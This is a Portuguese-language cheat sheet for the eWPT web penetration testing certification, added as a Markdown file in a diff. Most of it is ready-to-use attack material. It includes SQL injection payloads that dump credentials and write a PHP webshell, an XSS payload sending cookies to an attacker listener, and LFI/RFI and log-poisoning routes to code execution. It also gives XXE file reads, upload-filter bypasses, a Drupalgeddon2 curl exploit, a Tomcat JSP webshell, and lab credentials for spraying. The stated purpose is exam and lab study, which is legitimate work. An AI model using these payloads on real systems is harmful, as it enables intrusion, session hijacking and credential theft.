@@ -1,0 +1,400 @@
+# 🧠 eWPT Cheat Sheet
+
+---
+
+## 🔍 1. Reconhecimento e Fuzzing Web
+
+### ⚙️ Enumeração Ativa e Passiva
+```bash
+# Identificação de tecnologias
+whatweb http://<IP>
+whatweb --aggression 3 http://<IP>
+
+# Varredura básica de serviços web com Nmap
+nmap -p80,443 -sV --script http-enum,http-title,http-methods <IP>
+```
+
+### 📂 Descoberta de Diretórios e Arquivos (Fuzzing)
+*Sempre executar pesquisas recursivas em CMS e diretórios interessantes para encontrar arquivos ocultos.*
+
+```bash
+# Gobuster - Busca recursiva e extensões comuns
+gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -r --depth 3 -x php,txt,html,bak,zip
+
+# Dirsearch - Fuzzing recursivo (rápido e automático)
+dirsearch -u http://<IP> -r -R 3 -e php,txt,html,bak,zip,xml,json
+
+# FFUF - Descoberta recursiva com controle fino
+ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -recursion -recursion-depth 3 -e .php,.txt,.bak,.zip -v
+```
+
+#### 🔁 Script de Automatização (Loop Gobuster)
+_Útil quando se tem múltiplos hosts mapeados em hosts.txt ou subdomínios:_
+
+```bash
+for ewpt in $(cat hosts.txt); do
+    gobuster dir -u http://$ewpt -w /usr/share/wordlists/seclists/Discovery/directory-list-lowercase-2.3-small.txt -o results_$ewpt.txt
+done
+```
+
+> 💡 **Dica de Ouro:** Focar em mapear cada máquina individualmente e priorizar aquelas que rodam CMS conhecidos (WordPress, Drupal, Joomla) ou que expõem portais de login.
+
+---
+
+## 💉 2. Injeção de SQL (SQLi)
+
+### 🧪 Detecção Manual e Testes Iniciais
+```sql
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1'/*
+' OR '1'='1 or admin' --
+' or 1=1 limit 1 -- -
+```
+
+### 🗺️ SQLi Union-Based (Passo a Passo)
+1. **Determinar número de colunas:**
+   ```sql
+   ' ORDER BY 1 -- -
+   ' ORDER BY 2 -- -  # Repetir até retornar erro
+   ```
+2. **Identificar colunas com tipos de dados compatíveis (Strings):**
+   ```sql
+   ' UNION SELECT 1,2,3 -- -
+   # Se o resultado refletir na tela, substitua o número da coluna que aparece pelos payloads abaixo.
+   ```
+3. **Extrair informações do Servidor:**
+   ```sql
+   ' UNION SELECT 1,version(),user() -- -  # MySQL
+   ' UNION SELECT 1,@@version,current_user -- -  # MSSQL
+   ```
+4. **Extrair Nomes dos Bancos de Dados (MySQL):**
+   ```sql
+   ' UNION SELECT 1,schema_name,3 FROM information_schema.schemata -- -
+   ```
+5. **Extrair Tabelas de um Banco de Dados:**
+   ```sql
+   ' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='nome_do_banco' -- -
+   ```
+6. **Extrair Colunas de uma Tabela:**
+   ```sql
+   ' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='usuarios' -- -
+   ```
+7. **Dumping de Credenciais/Dados:**
+   ```sql
+   ' UNION SELECT 1,group_concat(username,':',password),3 FROM usuarios -- -
+   ```
+
+### 🐚 SQLi para Execução de Comandos (RCE)
+Se o banco de dados tiver permissão de escrita e soubermos o caminho absoluto do diretório web (ex. `/var/www/html`), podemos injetar uma webshell:
+
+```sql
+' UNION SELECT 1, "<?php system($_GET['cmd']); ?>", 3 INTO OUTFILE '/var/www/html/shell.php' -- -
+```
+*Acessar em:* `http://<IP>/shell.php?cmd=whoami`
+
+### 🤖 Automação com SQLMap
+```bash
+# Scan básico passando parâmetros de GET
+sqlmap -u "http://<IP>/index.php?id=1" --batch
+
+# Scan com POST usando requisição interceptada pelo Burp Suite
+sqlmap -r request.txt -p id --batch
+
+# Aumentar nível de busca se não for detectado na primeira tentativa
+sqlmap -u "http://<IP>/index.php?id=1" --level=5 --risk=3 --dbms=mysql
+
+# Obter shell interativa no banco (se permissões permitirem)
+sqlmap -u "http://<IP>/index.php?id=1" --os-shell
+
+# Extração direta de bancos e tabelas
+sqlmap -u "http://<IP>/index.php?id=1" --dbs
+sqlmap -u "http://<IP>/index.php?id=1" -D target_db --tables
+sqlmap -u "http://<IP>/index.php?id=1" -D target_db -T users --dump
+```
+
+---
+
+## 📜 3. Cross-Site Scripting (XSS)
+
+### 🧪 Payloads Básicos (Refletido / Gravado)
+```html
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(document.cookie)>
+<svg/onload=alert(1)>
+```
+
+### 🍪 Session Hijacking (Roubo de Cookie)
+1. **Configurar o listener no Kali:**
+   ```bash
+   nc -lvnp 8081
+   ```
+2. **Payload XSS injetado na aplicação:**
+   ```html
+   <script>
+   fetch('http://<IP_KALI>:8081/log?cookie=' + btoa(document.cookie));
+   </script>
+   ```
+   *Alternativa com Image tag (útil em ambientes restritos):*
+   ```html
+   <img src="x" onerror="this.src='http://<IP_KALI>:8081/?c='+document.cookie; this.removeAttribute('onerror');">
+   ```
+
+---
+
+## 📂 4. Inclusão de Arquivos (LFI / RFI)
+
+### 🔎 LFI Básico (Caminhos comuns)
+* **Linux:** `/etc/passwd`, `/etc/hosts`, `/etc/issue`, `/proc/self/environ`, `/var/log/apache2/access.log`, `/var/log/nginx/access.log`
+* **Windows:** `C:\Windows\win.ini`, `C:\Windows\System32\drivers\etc\hosts`
+
+```
+http://<IP>/index.php?page=../../../../etc/passwd
+http://<IP>/index.php?page=../../../../Windows/win.ini
+```
+
+### 🧬 Wrappers e Filtros PHP (Essencial)
+```ini
+# Ler código fonte PHP sem execução (retorna em Base64)
+php://filter/convert.base64-encode/resource=index.php
+
+# Execução de código via php://input (Requer allow_url_include=On)
+# Fazer requisição POST para o LFI com o payload PHP no corpo:
+POST http://<IP>/index.php?page=php://input
+Corpo: <?php system('whoami'); ?>
+
+# Execução de código via data:// wrapper (Requer allow_url_include=On)
+http://<IP>/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=whoami
+```
+
+### ☠️ LFI para RCE via Poisoning
+
+#### 1. Apache / Nginx Log Poisoning
+1. **Enviar payload malicioso no Header `User-Agent` (ou em requisição mal formatada para gerar erro):**
+   ```php
+   <?php system($_GET['cmd']); ?>
+   ```
+2. **Acessar o arquivo de log através do LFI:**
+   ```
+   http://<IP>/index.php?page=../../../../var/log/apache2/access.log&cmd=id
+   ```
+
+#### 2. Session Poisoning (PHP Sessions)
+1. **Identificar o Cookie de Sessão PHP (`PHPSESSID`).**
+2. **Gravar o payload PHP em uma variável refletida que é salva na sessão (ex: um campo de nome no perfil).**
+3. **Acessar o arquivo de sessão correspondente no servidor:**
+   ```
+   # O caminho comum de sessões no Linux é /var/lib/php/sessions/ ou /var/lib/php5/
+   http://<IP>/index.php?page=../../../../var/lib/php/sessions/sess_<PHPSESSID>&cmd=whoami
+   ```
+
+### 🌐 Remote File Inclusion (RFI)
+*Requer `allow_url_include=On` nas configurações do PHP.*
+
+1. **Hospedar arquivo malicioso no atacante:**
+   ```bash
+   echo '<?php system($_GET["cmd"]); ?>' > shell.txt
+   python3 -m http.server 80
+   ```
+2. **Executar RFI no alvo:**
+   ```
+   http://<IP>/index.php?page=http://<IP_KALI>/shell.txt&cmd=whoami
+   ```
+
+---
+
+## 🧬 5. XML External Entity (XXE)
+
+### 📂 Leitura de Arquivo Local (LFI via XML)
+Injetar no cabeçalho ou payload XML para extrair arquivos do sistema.
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE test [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+  <name>&xxe;</name>
+</root>
+```
+
+### 🌐 SOAP Web Services XXE
+*Em um serviço web SOAP, se for necessário ler arquivos por meio de uma entidade externa XML:*
+
+```xml
+POST /soap-endpoint HTTP/1.1
+Host: target.local
+Content-Type: text/xml; charset=utf-8
+Content-Length: [tamanho]
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <GetProductDetails xmlns="http://tempuri.org/">
+      <productId>&xxe;</productId>
+    </GetProductDetails>
+  </soap:Body>
+</soap:Envelope>
+```
+
+---
+
+## 📤 6. Vulnerabilidades de Upload de Arquivo
+
+### 🛡️ Bypasses Comuns de Extensão
+
+#### 1. Extensões alternativas suportadas pelo servidor web:
+* **PHP:** `.php3`, `.php4`, `.php5`, `.phtml`, `.phar`, `.pgif`, `.phtm`
+* **ASP / ASPX:** `.cer`, `.asa`, `.asax`, `.ashx`, `.asmx`
+* **JSP:** `.jspx`, `.jsw`, `.jsv`, `.war`
+
+#### 2. Dupla Extensão ou Bypass de Verificação Simples (Regex mal feito):
+* `.php.jpg`, `.php.png`, `.pHp`, `.pHP5`
+* Injeção de Null Byte (PHP < 5.3.4): `shell.php%00.jpg` ou `shell.php\x00.jpg`
+
+### 📄 Bypass de Content-Type e Assinatura (Magic Bytes)
+1. **Alterar Content-Type na requisição HTTP interceptada:**
+   * Mudar `Content-Type: application/x-php` para `Content-Type: image/jpeg` ou `image/png`.
+2. **Forjar a assinatura do arquivo (adicionando cabeçalhos de imagem no início do arquivo malicioso):**
+   * **GIF:** Adicionar `GIF89a;` no início do payload PHP.
+   * **JPEG:** Adicionar `\xFF\xD8\xFF\xE0` (bytes mágicos de JPEG).
+   
+```php
+GIF89a;
+<?php system($_GET['cmd']); ?>
+```
+
+### ⚙️ Sobrescrita de Configurações do Servidor
+Se for possível fazer o upload de arquivos `.htaccess` (Apache) ou `.user.ini` (Nginx/PHP), podemos instruir o servidor a tratar extensões inofensivas como scripts PHP.
+
+#### 1. Arquivo `.htaccess`
+Subir um arquivo chamado `.htaccess` com o conteúdo abaixo:
+```apache
+AddType application/x-httpd-php .txt
+# Ou
+AddHandler application/x-httpd-php .jpg
+```
+*Agora, ao fazer upload de `shell.txt` ou `shell.jpg`, o servidor executará como script PHP.*
+
+#### 2. Arquivo `.user.ini`
+Subir um arquivo `.user.ini` com o conteúdo:
+```ini
+auto_prepend_file=shell.png
+```
+*Qualquer execução de script PHP na pasta irá automaticamente incluir e executar `shell.png`.*
+
+---
+
+## 🛡️ 7. Segurança de CMS e Aplicações Específicas
+
+### 📝 WordPress
+```bash
+# Scan completo de vulnerabilidades e plugins desatualizados
+wpscan --url http://<IP> --enumerate vp,vt,u
+
+# Brute force contra login administrativo (usando API XML-RPC)
+wpscan --url http://<IP> -U admin -P /usr/share/wordlists/rockyou.txt
+```
+> 💡 Se o arquivo `/xmlrpc.php` estiver ativo, ele pode ser usado diretamente para realizar brute-force de forma mais rápida devido a requisições em batch de login.
+
+### 💧 Drupal
+
+#### 💣 Ataque de Brute-Force no Drupal
+* O Drupal possui bloqueios de login rígidos (flood limit), por isso, a enumeração e ataques de força bruta precisam ser feitos com cautela.
+
+#### 🎯 Drupalgeddon 2 (CVE-2018-7600)
+* Muito comum no exame e em ambientes de laboratório de eWPT.
+* **Explicação:** Vulnerabilidade de RCE através do sistema de renderização de formulários do Drupal (Form API).
+* [Referência Oficial INE](https://ine.com/blog/cve-2018-7600-drupalgeddon-2?source=post_page-----c6afdbb5a682---------------------------------------)
+
+**Exploração Automática (Metasploit):**
+```bash
+use exploit/unix/webapp/drupal_drupalgeddon2
+set RHOSTS <IP>
+set TARGETURI /
+run
+```
+
+**Exploração Manual (cURL):**
+```bash
+curl -i -k -s -X POST 'http://<IP>/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-raw 'form_id=user_register_form&_drupal_ajax=1&mail[%23post_render][]=exec&mail[%23type]=markup&mail[%23markup]=whoami'
+```
+
+### 🦁 Joomla
+```bash
+# Executar joomscan
+joomscan --url http://<IP>
+```
+
+### ☕ Apache Tomcat RCE (CVE-2017-12617)
+Se a configuração do Tomcat permitir requisições HTTP do tipo `PUT` sem autenticação adequada, podemos subir arquivos JSP diretamente no servidor.
+
+**Exploração Manual:**
+```http
+PUT /shell.jsp/ HTTP/1.1
+Host: target.local
+Content-Length: [tamanho]
+
+<%
+  if (request.getParameter("cmd") != null) {
+    out.println(new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()).useDelimiter("\\A").next());
+  }
+%>
+```
+*Note a barra final no endpoint `/shell.jsp/` ou o uso de caracteres alternativos para burlar validações internas do Tomcat.*
+
+---
+
+## 🔑 8. Autenticação e Sessões
+
+### 🔒 Brute-force de Autenticação Básica (HTTP Basic Auth) com Burp Suite
+Quando a aplicação solicita login com caixa de diálogo HTTP (Basic Auth), as credenciais são enviadas no header `Authorization: Basic <base64(user:pass)>`.
+
+#### Configuração no Burp Suite Intruder:
+1. Intercepte a requisição e envie para o **Intruder**.
+2. Vá na aba **Positions** e marque o hash codificado em base64 como payload: `Authorization: Basic §[HASH_AQUI]§`.
+3. Vá na aba **Payloads**:
+   - Defina o **Payload Type** como **Custom Iterator**.
+   - Na posição **1**: insira a lista de usuários.
+   - Na posição **2**: insira um caractere divisor de dois pontos `:` (colon).
+   - Na posição **3**: insira a lista de senhas.
+4. Role para baixo até a seção **Payload Processing** e clique em **Add**:
+   - Selecione a regra **Base64 Encode**.
+   - Desmarque a opção *url-encode payload characters* (se aplicável, para não codificar `=` no final).
+5. Inicie o ataque e busque por respostas HTTP `200 OK` (ou `302 Redirect`) em vez de `401 Unauthorized`.
+
+---
+
+## 🗄️ 9. Dados de Ambiente e Laboratórios (Notas Pessoais)
+
+### 🕵️ Mapeamento de Credenciais de Banco e Senhas de Laboratório
+Sempre analise logs, código-fonte e backups em busca de arquivos de configuração contendo conexões de banco de dados (ex: `mysql.config`).
+
+* **Chave secreta oculta:** Em um aplicativo Python Gunicorn:wsgi Django, verifique a variável `SECRET_KEY` no arquivo de configurações ou no escopo de ambiente.
+
+#### Banco de dados / Acesso:
+* phpMyAdmin disponível em: `cms.nexustech.com:8080` (porta 8080)
+* Host: `nexustech.com` - User: `admin` - Senha: `12345`
+
+#### Credenciais identificadas para testes cruzados (Cross-Credential Spraying):
+```
+se admin:manager - funciona na interface web;
+se admin:zxcvbnm - também funciona (já que foi reportado como sucesso);
+se root:tintin   - permite acesso ao banco MySQL;
+```
+
+---
+
+# 🏆 Máquinas de Treinamento CTF (TryHackMe)
+Pratique seus conhecimentos de eWPT em ambientes web controlados:
+
+* [THM - Blog](https://tryhackme.com/room/blog?source=post_page-----c6afdbb5a682---------------------------------------) - Foco em WordPress, enumeração e RCE.
+* [THM - Smol](https://tryhackme.com/room/smol?source=post_page-----c6afdbb5a682---------------------------------------) - WordPress com plugins interessantes.
+* [THM - Adana](https://tryhackme.com/room/adana?source=post_page-----c6afdbb5a682---------------------------------------) - Testes web detalhados.
+* [THM - Mountaineer Linux](https://tryhackme.com/room/mountaineerlinux?source=post_page-----c6afdbb5a682---------------------------------------) - Integração web e privilégios.
